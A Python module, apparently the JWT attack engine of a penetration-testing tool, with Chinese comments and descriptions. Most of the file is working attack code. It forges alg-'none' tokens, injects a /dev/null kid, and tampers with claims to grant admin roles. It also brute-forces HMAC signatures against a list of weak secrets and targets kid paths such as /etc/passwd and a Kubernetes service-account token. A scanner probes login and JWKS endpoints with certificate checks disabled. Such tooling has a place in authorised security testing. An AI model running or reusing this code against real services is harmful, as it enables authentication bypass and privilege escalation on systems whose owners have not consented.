import base64
import hashlib
import hmac
import json
import time
from typing import Dict, List, Optional, Tuple
from app.utils.http_client import http_request
from app.utils.logger import get_logger

logger = get_logger("jwt_engine")

JWT_ATTACKS = {
    "none_algorithm": {
        "description": "将alg改为none绕过签名验证",
        "technique": "修改Header中的alg为none，删除签名",
    },
    "algorithm_confusion": {
        "description": "RS256→HS256算法混淆攻击",
        "technique": "使用公钥作为HMAC密钥重新签名",
    },
    "key_bruteforce": {
        "description": "弱密钥爆破",
        "technique": "使用常见弱密钥字典爆破HMAC签名",
    },
    "kid_injection": {
        "description": "kid参数注入攻击",
        "technique": "通过kid参数进行路径遍历或SQL注入",
    },
    "jwk_injection": {
        "description": "JWK注入伪造密钥",
        "technique": "在Header中注入自定义JWK公钥",
    },
    "jku_injection": {
        "description": "JKU远程密钥注入",
        "technique": "将jku指向攻击者控制的JWKS端点",
    },
    "x5u_injection": {
        "description": "X5U证书注入",
        "technique": "将x5u指向攻击者控制的证书",
    },
    "claim_tampering": {
        "description": "JWT Claims篡改",
        "technique": "修改iss/exp/iat/nbf等声明绕过验证",
    },
}

WEAK_SECRETS = [
    "secret", "password", "123456", "admin", "test", "key",
    "jwt_secret", "jwt-key", "my-secret", "supersecret",
    "your-256-bit-secret", "shhhhh", "keyboard cat",
    "changeme", "default", "qwerty", "abc123",
    "HS256-secret", "token-secret", "auth-secret",
    "wyqyan", "wyqyan2024", "wyqyan-secret",
]

COMMON_KID_PATHS = [
    "/dev/null", "/etc/passwd", "/proc/self/environ",
    "/app/config/secret.key", "/var/run/secrets/kubernetes.io/serviceaccount/token",
    "file:///dev/null", "file:///etc/passwd",
]


class JWTAnalyzer:
    def __init__(self):
        self.findings = []

    def analyze_token(self, token: str) -> Dict:
        result = {
            "original_token": token,
            "header": {},
            "payload": {},
            "signature": "",
            "is_valid_format": False,
            "algorithm": None,
            "vulnerabilities": [],
            "attack_results": [],
        }
        try:
            parts = token.split(".")
            if len(parts) != 3:
                return result
            result["header"] = self._decode_segment(parts[0])
            result["payload"] = self._decode_segment(parts[1])
            result["signature"] = parts[2]
            result["is_valid_format"] = True
            result["algorithm"] = result["header"].get("alg", "unknown")
            result["vulnerabilities"] = self._check_vulnerabilities(result["header"], result["payload"])
            result["attack_results"] = self._generate_attacks(parts[0], parts[1], parts[2], result["header"])
        except Exception as e:
            logger.error(f"JWT分析失败: {e}")
        return result

    def _decode_segment(self, segment: str) -> Dict:
        padding = 4 - len(segment) % 4
        if padding != 4:
            segment += "=" * padding
        try:
            decoded = base64.urlsafe_b64decode(segment)
            return json.loads(decoded)
        except Exception:
            return {"raw": segment}

    def _check_vulnerabilities(self, header: dict, payload: dict) -> List[Dict]:
        vulns = []
        alg = header.get("alg", "")
        if alg == "none":
            vulns.append({"type": "none_algorithm", "risk": "critical",
                         "detail": "算法为none，任何token都被接受"})
        if alg.startswith("HS") and alg in ("HS256", "HS384", "HS512"):
            vulns.append({"type": "weak_hmac", "risk": "high",
                         "detail": f"HMAC算法({alg})可能使用弱密钥"})
        if "kid" in header:
            kid = header["kid"]
            if any(p in kid for p in ["/", "\\", "..", "file://"]):
                vulns.append({"type": "kid_path_traversal", "risk": "critical",
                             "detail": f"kid参数存在路径遍历: {kid}"})
        exp = payload.get("exp")
        if exp:
            if exp < time.time():
                vulns.append({"type": "expired_token", "risk": "info",
                             "detail": "Token已过期"})
        if not payload.get("iss"):
            vulns.append({"type": "no_issuer", "risk": "low",
                         "detail": "缺少iss声明，无法验证发行者"})
        if not payload.get("aud"):
            vulns.append({"type": "no_audience", "risk": "low",
                         "detail": "缺少aud声明"})
        return vulns

    def _generate_attacks(self, header_b64: str, payload_b64: str,
                          signature: str, header: dict) -> List[Dict]:
        attacks = []
        attacks.append(self._attack_none_algorithm(payload_b64))
        if header.get("alg", "").startswith("HS"):
            attacks.extend(self._attack_key_bruteforce(header_b64, payload_b64, signature))
        if "kid" in header:
            attacks.append(self._attack_kid_injection(payload_b64, header))
        attacks.append(self._attack_jwk_injection(payload_b64))
        attacks.append(self._attack_claim_tampering(header_b64, payload_b64))
        return attacks

    def _attack_none_algorithm(self, payload_b64: str) -> Dict:
        none_header = base64.urlsafe_b64encode(
            json.dumps({"alg": "none", "typ": "JWT"}).encode()
        ).rstrip(b"=").decode()
        forged = f"{none_header}.{payload_b64}."
        return {"attack": "none_algorithm", "forged_token": forged, "risk": "critical"}

    def _attack_key_bruteforce(self, header_b64: str, payload_b64: str,
                                signature: str) -> List[Dict]:
        results = []
        data = f"{header_b64}.{payload_b64}"
        for secret in WEAK_SECRETS:
            try:
                expected = hmac.new(
                    secret.encode(), data.encode(), hashlib.sha256
                ).digest()
                expected_b64 = base64.urlsafe_b64encode(expected).rstrip(b"=").decode()
                sig_padding = signature + "=" * (4 - len(signature) % 4)
                actual_sig = base64.urlsafe_b64decode(sig_padding)
                if hmac.compare_digest(expected, actual_sig):
                    results.append({
                        "attack": "key_bruteforce",
                        "secret_found": secret,
                        "risk": "critical",
                    })
                    break
            except Exception:
                continue
        if not results:
            results.append({"attack": "key_bruteforce", "result": "未找到弱密钥"})
        return results

    def _attack_kid_injection(self, payload_b64: str, header: dict) -> Dict:
        kid = header.get("kid", "")
        kid_header = {**header, "kid": "/dev/null"}
        kid_header_b64 = base64.urlsafe_b64encode(
            json.dumps(kid_header).encode()
        ).rstrip(b"=").decode()
        forged = f"{kid_header_b64}.{payload_b64}."
        return {
            "attack": "kid_injection",
            "original_kid": kid,
            "injected_kid": "/dev/null",
            "forged_token": forged,
            "risk": "critical",
        }

    def _attack_jwk_injection(self, payload_b64: str) -> Dict:
        return {
            "attack": "jwk_injection",
            "detail": "需要生成RSA密钥对并注入JWK到Header",
            "risk": "high",
        }

    def _attack_claim_tampering(self, header_b64: str, payload_b64: str) -> Dict:
        try:
            payload = json.loads(base64.urlsafe_b64decode(
                payload_b64 + "=" * (4 - len(payload_b64) % 4)
            ))
            if "role" in payload:
                payload["role"] = "admin"
            if "is_admin" in payload:
                payload["is_admin"] = True
            if "permissions" in payload:
                payload["permissions"] = ["admin", "superadmin"]
            tampered_payload = base64.urlsafe_b64encode(
                json.dumps(payload).encode()
            ).rstrip(b"=").decode()
            forged = f"{header_b64}.{tampered_payload}."
            return {
                "attack": "claim_tampering",
                "original_payload": payload,
                "forged_token": forged,
                "risk": "high",
            }
        except Exception:
            return {"attack": "claim_tampering", "error": "Payload解析失败"}


class JWTEndpointScanner:
    def __init__(self, target_url: str, timeout: int = 10):
        self.target_url = target_url.rstrip("/")
        self.timeout = timeout

    def find_jwt_endpoints(self) -> List[Dict]:
        endpoints = [
            "/api/auth/login", "/api/login", "/auth/login",
            "/api/token", "/token", "/oauth/token",
            "/api/v1/auth/login", "/api/v1/login",
            "/api/user/login", "/api/users/login",
            "/api/jwks.json", "/.well-known/jwks.json",
            "/.well-known/openid-configuration",
        ]
        found = []
        for endpoint in endpoints:
            url = f"{self.target_url}{endpoint}"
            resp = http_request("GET", url, timeout=self.timeout, verify=False)
            if resp and resp.get("status_code") in (200, 401, 403, 405):
                found.append({
                    "endpoint": endpoint,
                    "status_code": resp.get("status_code"),
                    "has_jwt_header": "authorization" in str(resp.get("headers", {})).lower(),
                })
        return found

    def extract_jwt_from_response(self, response: Dict) -> Optional[str]:
        body = str(response.get("text", ""))
        jwt_pattern = r'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+'
        import re
        match = re.search(jwt_pattern, body)
        return match.group(0) if match else None


def analyze_jwt(token: str) -> Dict:
    analyzer = JWTAnalyzer()
    return analyzer.analyze_token(token)


def scan_jwt_endpoints(target_url: str, timeout: int = 10) -> List[Dict]:
    scanner = JWTEndpointScanner(target_url, timeout)
    return scanner.find_jwt_endpoints()
